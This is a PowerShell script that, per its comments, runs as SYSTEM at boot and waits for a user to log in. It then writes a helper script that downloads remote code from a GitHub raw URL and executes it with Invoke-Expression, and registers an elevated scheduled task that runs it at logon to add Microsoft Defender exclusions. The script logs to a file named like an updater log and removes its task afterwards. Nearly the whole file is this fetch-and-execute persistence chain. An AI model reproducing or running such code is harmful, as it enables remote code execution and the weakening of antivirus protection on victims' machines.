# region --- Configuration ---
$logPath = "C:\Windows\Temp\updater_log.txt" # Your specified log path

# URL to the raw PowerShell command containing exclusion logic (from your GitHub)
$githubRawCommandUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1"

# --- Name for the User-Specific Scheduled Task ---
# This task will be created by the boot script and will trigger the UAC prompt.
$userUACTriggerTaskName = "ExclusionUserUACTrigger"
# endregion

# region --- Logging Function ---
function Log($msg) {
    $ts = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    try {
        $ts | Out-File -FilePath $logPath -Append -Encoding utf8 -ErrorAction Stop
    } catch {
        Write-Host "ERROR: Could not write to log file: $_" # Fallback to console
        Write-Host $ts
    }
}
# endregion

# region --- Main Script Logic (Assumes running as SYSTEM from irm | iex on Boot) ---
Log "➡️ Script started via existing boot service. Context: User: $env:USERNAME, Interactive: $([Environment]::UserInteractive)"

# --- Wait for a user to log in ---
Log "Running from SYSTEM context on boot. Waiting for user login..."

$maxAttempts = 60 # 60 * 5 seconds = 5 minutes of waiting
$attempt = 0
$userDetected = $null

while ($attempt -lt $maxAttempts -and -not $userDetected) {
    try {
        # Get the name of the user currently logged into the console session (if any)
        # This works even if the script is running in Session 0 (SYSTEM context)
        $userDetected = (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty UserName).Split('\')[-1]
    } catch {
        Log "⚠️ Could not get current user: $_"
    }

    if ([string]::IsNullOrWhiteSpace($userDetected) -or $userDetected -eq "SYSTEM") {
        # Check if the detected user is actually a logged-in user, not SYSTEM or blank
        $userDetected = $null # Reset if it's not a real user session
    }

    if (-not $userDetected) {
        Log "⏳ No interactive user yet. Waiting 5s... (Attempt $((1 + $attempt))/$maxAttempts)"
        Start-Sleep -Seconds 5
        $attempt++
    }
}

if (-not $userDetected) {
    Log "❌ Still no interactive user after waiting ($maxAttempts attempts). Exiting. Will run again on next boot."
    exit # Exit if no user found
}

Log "✅ Interactive user detected: $userDetected"

# --- Create the temporary script for the user-triggered UAC prompt ---
# This temporary script will contain the actual logic to fetch and run the command.
$userExclusionScriptPath = "$env:ProgramData\UserExclusionTrigger.ps1"

# The content of the temporary script. It re-uses the log path and GitHub URL from the parent script.
$userExclusionScriptContent = @"
# This script is executed by a user-specific scheduled task with a UAC prompt.
# It fetches a PowerShell command from GitHub and executes it.

`$logPath = '$logPath'
`$githubRawCommandUrl = '$githubRawCommandUrl'
`$userUACTriggerTaskName = '$userUACTriggerTaskName'

function Log(`$msg) {
    `$ts = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), `$msg
    try {
        `$ts | Out-File -FilePath `$logPath -Append -Encoding utf8 -ErrorAction Stop
    } catch {
        Write-Host "ERROR: Could not write to log file from user-triggered script: `$_. Check `$logPath for permissions."
        Write-Host `$ts
    }
}

Log "➡️ User-triggered script started. User: `$env:USERNAME, Interactive: `$(`[Environment]::UserInteractive)"

try {
    Log "Attempting to fetch command from GitHub: `$githubRawCommandUrl"
    `$webClient = New-Object System.Net.WebClient
    `$webClient.Headers.Add("User-Agent", "PowerShell Script") # Good practice for web requests
    `$commandToExecute = `$webClient.DownloadString(`$githubRawCommandUrl)
    Log "Successfully fetched command. Executing..."

    # Execute the fetched command directly
    Invoke-Expression `$commandToExecute

    Log "✅ GitHub command executed successfully."

} catch {
    Log "❌ Error fetching or executing GitHub command: `$_. Check URL and content."
}

# Clean up this user-specific scheduled task after execution
try {
    Log "Attempting to remove user-specific task: `$userUACTriggerTaskName"
    Unregister-ScheduledTask -TaskName `$userUACTriggerTaskName -Confirm:`$false -ErrorAction Stop
    Log "🧹 Cleaned up user-specific scheduled task '`$userUACTriggerTaskName'."
} catch {
    Log "⚠️ Error cleaning up user-specific task '`$userUACTriggerTaskName': `$_. Manual cleanup might be needed."
}

Log "✅ User-triggered script finished."
exit # Ensure immediate closure of this script
"@
$userExclusionScriptContent | Out-File -FilePath $userExclusionScriptPath -Encoding utf8
Log "📄 User-specific exclusion script written to $userExclusionScriptPath"

# --- Create the user-specific scheduled task with UAC prompt ---
try {
    # Remove old user task if it existed (e.g., if a previous run failed or was interrupted)
    Unregister-ScheduledTask -TaskName $userUACTriggerTaskName -Confirm:$false -ErrorAction SilentlyContinue
    Log "🧹 Old user-specific task '$userUACTriggerTaskName' removed if it existed."

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$userExclusionScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn # Trigger when user logs in
    # Principal: Run as the detected user, highest privileges, interactive (for UAC)
    $principal = New-ScheduledTaskPrincipal -UserId $userDetected -RunLevel Highest -LogonType Interactive

    Register-ScheduledTask -TaskName $userUACTriggerTaskName -Action $action -Trigger $trigger -Principal $principal -Description "Adds Defender exclusions after user login with UAC prompt (fetched from GitHub)."
    Log "✅ Scheduled task '$userUACTriggerTaskName' created for user '$userDetected' to prompt for UAC at logon."

} catch {
    Log "❌ Failed to create user-specific UAC-prompting task: $_"
}

Log "Script finished setting up user task. Waiting for user login and UAC."
exit # Exit the SYSTEM-context script
# endregion
